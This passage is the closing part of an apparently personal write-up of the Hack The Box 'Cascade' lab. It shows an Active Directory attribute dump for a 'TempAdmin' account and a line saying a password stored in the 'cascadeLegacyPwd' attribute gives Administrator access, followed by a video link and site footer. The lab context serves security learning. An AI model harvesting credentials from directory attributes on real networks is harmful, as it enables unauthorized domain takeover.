</span></span><span class=line><span class=cl>sAMAccountName                  : TempAdmin
</span></span><span class=line><span class=cl>sDRightsEffective               : 0
</span></span><span class=line><span class=cl>userAccountControl              : 66048
</span></span><span class=line><span class=cl>userPrincipalName               : TempAdmin@cascade.local
</span></span><span class=line><span class=cl>uSNChanged                      : 237705
</span></span><span class=line><span class=cl>uSNCreated                      : 237695
</span></span><span class=line><span class=cl>whenChanged                     : 1/27/2020 3:24:34 AM
</span></span><span class=line><span class=cl>whenCreated                     : 1/27/2020 3:23:08 AM
</span></span></code></pre></td></tr></table></div></div><p>Using the password inside <code>cascadeLegacyPwd</code> attribute, we can login as the Administrator and get the root password</p><a href=#videos-references><h2 id=videos-references><span class=hanchor arialabel=Anchor># </span>Videos references</h2></a><a href=#ippsec><h3 id=ippsec><span class=hanchor arialabel=Anchor># </span>IppSec</h3></a><div style=position:relative;padding-bottom:56.25%;height:0;overflow:hidden><iframe src=https://www.youtube.com/embed/mr-fsVLoQGw style=position:absolute;top:0;left:0;width:100%;height:100%;border:0 allowfullscreen title="YouTube Video"></iframe></div></article><hr><div class=page-end id=footer><div class=backlinks-container><h3>Backlinks</h3><ul class=backlinks><li><a href=/SecNotes/HTB/Medium/Medium/ data-ctx=Cascade data-src=/HTB/Medium/Medium class=internal-link>HTB - Medium</a></li></ul></div><div><script async src=https://cdn.jsdelivr.net/npm/d3@6.7.0/dist/d3.min.js integrity="sha256-+7jaYCp29O1JusNWHaYtgUn6EhuP0VaFuswhNV06MyI=" crossorigin=anonymous></script><h3>Interactive Graph</h3><div id=graph-container></div><style>:root{--g-node:var(--secondary);--g-node-active:var(--primary);--g-node-inactive:var(--visited);--g-link:var(--outlinegray);--g-link-active:#5a7282}</style><script src=https://cavonstavant.github.io/SecNotes/js/graph.6579af7b10c818dbd2ca038702db0224.js></script></div></div><div id=contact_buttons><footer><p>Made by Cavonstavant using <a href=https://github.com/jackyzha0/quartz>Quartz</a>, © 2023</p><ul><li><a href=https://cavonstavant.github.io/SecNotes/>Home</a></li><li><a href=https://twitter.com/Cavonstavant>Twitter</a></li><li><a href=https://github.com/Cavonstavant>GitHub</a></li><li><a href=https://www.linkedin.com/in/constant-vigneron/>LinkedIn</a></li></ul></footer></div></div></body></html>